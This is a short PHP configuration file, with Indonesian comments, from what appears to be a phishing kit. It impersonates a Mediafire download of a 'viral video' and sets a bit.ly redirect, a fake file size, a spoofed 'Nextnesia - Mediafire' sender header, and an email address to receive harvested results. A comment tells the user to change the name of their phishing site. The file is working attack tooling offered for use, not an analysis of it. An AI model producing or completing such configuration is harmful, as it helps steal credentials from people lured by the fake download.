<?php

$redirect = 'https://bit.ly/mediafire-terbaru'; // link mediafire asli/redirect
$namaweb = 'Video Viral Terbaru'; // Ganti nama web phising mu di sini 
$ukuran = '22.5MB'; // Ukuran download video

$sender = 'From: Nextnesia - Mediafire <yumekodeveloper@gmail.com>'; //Nama Ress
$email = "emailkamu@gmail.com"; // Email kamu

?>